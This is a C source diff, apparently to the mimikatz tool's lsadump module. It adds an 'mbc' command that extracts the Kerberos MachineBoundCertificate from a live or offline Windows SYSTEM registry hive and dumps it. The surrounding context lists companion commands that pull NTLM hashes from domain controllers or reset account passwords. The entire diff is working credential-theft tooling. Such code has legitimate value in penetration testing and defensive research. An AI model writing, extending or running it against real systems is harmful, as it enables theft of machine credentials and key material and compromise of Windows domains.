@@ -19,6 +19,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_changentlm,	L"changentlm",	L"Ask a server to set a new password/ntlm for one user"},
 	{kuhl_m_lsadump_netsync,	L"netsync",		L"Ask a DC to send current and previous NTLM hash of DC/SRV/WKS"},
 	{kuhl_m_lsadump_packages,	L"packages",	NULL},
+	{kuhl_m_lsadump_mbc,		L"mbc",			NULL},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -2334,5 +2335,60 @@ NTSTATUS kuhl_m_lsadump_packages(int argc, wchar_t * argv[])
 		FreeContextBuffer(pPackageInfo);
 	}
 	else PRINT_ERROR(L"EnumerateSecurityPackages: 0x%08x\n", status);
+	return STATUS_SUCCESS;
+}
+
+BOOL kuhl_m_lsadump_mbc_data(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase)
+{
+	BOOL status = FALSE;
+	HKEY hCurrentControlSet;
+	PBYTE data;
+	DWORD dataLen;
+
+	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
+	{
+		if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, L"Control\\Lsa\\Kerberos\\Parameters", L"MachineBoundCertificate", NULL, (LPVOID *) &data, &dataLen))
+		{
+			kuhl_m_crypto_system_data(data, dataLen, L"MachineBoundCertificate", FALSE);
+			LocalFree(data);
+		}
+		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
+	}
+	return status;
+}
+
+NTSTATUS kuhl_m_lsadump_mbc(int argc, wchar_t * argv[])
+{
+	HANDLE hDataSystem;
+	PKULL_M_REGISTRY_HANDLE hRegistry;
+	HKEY hBase;
+	LPCWSTR szSystem = NULL;
+
+	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
+	{
+		hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+		if(hDataSystem != INVALID_HANDLE_VALUE)
+		{
+			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hRegistry))
+			{
+				kuhl_m_lsadump_mbc_data(hRegistry, NULL);
+				kull_m_registry_close(hRegistry);
+			}
+			CloseHandle(hDataSystem);
+		}
+		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+	}
+	else
+	{
+		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
+		{
+			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hBase))
+			{
+				kuhl_m_lsadump_mbc_data(hRegistry, hBase);
+				kull_m_registry_RegCloseKey(hRegistry, hBase);
+			}
+			kull_m_registry_close(hRegistry);
+		}
+	}
 	return STATUS_SUCCESS;
 }
